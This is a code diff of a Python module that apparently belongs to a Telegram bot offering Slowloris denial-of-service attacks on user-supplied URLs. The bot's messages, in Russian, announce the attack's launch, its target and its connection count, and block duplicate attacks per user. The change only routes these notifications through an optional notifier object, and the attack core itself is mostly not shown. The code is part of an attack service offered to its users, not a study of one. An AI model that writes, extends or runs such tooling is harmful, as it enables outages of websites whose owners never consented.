@@ -99,7 +99,7 @@ async def _slowloris_attack(host: str, port: int, path: str, use_ssl: bool,
 
     # Уведомляем пользователя о старте
     try:
-        await bot.send_message(user_id,
+        await _notify.send_message(user_id,
             f"⚡️ *Slowloris запущен!*\n"
             f"*└─ Цель:* `{url}`\n"
             f"*└─ Соединений:* `{len(sockets)}`\n"
@@ -153,7 +153,7 @@ async def _slowloris_attack(host: str, port: int, path: str, use_ssl: bool,
     )
 
     try:
-        await bot.send_message(user_id, caption_user, parse_mode="Markdown",
+        await _notify.send_message(user_id, caption_user, parse_mode="Markdown",
                                reply_markup=_kb.main_menu)
     except Exception:
         pass
@@ -167,13 +167,14 @@ async def _slowloris_attack(host: str, port: int, path: str, use_ssl: bool,
 
 
 async def main_slowloris(url: str, user_id: int, username: str,
-                          connections: int = 200, duration: int = 60):
+                          connections: int = 200, duration: int = 60, notify_bot=None):
+    _notify = notify_bot or bot
     """Запускает Slowloris атаку."""
     import keyboards as _kb
 
     # Проверяем нет ли уже активной атаки от этого пользователя
     if user_id in _active_attacks:
-        await bot.send_message(user_id,
+        await _notify.send_message(user_id,
             "⚠️ *У вас уже запущена атака!*\n*Дождитесь завершения.*",
             parse_mode="Markdown")
         return
@@ -181,7 +182,7 @@ async def main_slowloris(url: str, user_id: int, username: str,
     try:
         host, port, path, use_ssl = _parse_target(url)
     except Exception as e:
-        await bot.send_message(user_id, f"❌ *Неверный URL:* `{str(e)[:50]}`",
+        await _notify.send_message(user_id, f"❌ *Неверный URL:* `{str(e)[:50]}`",
             parse_mode="Markdown", reply_markup=_kb.main_menu)
         return
 
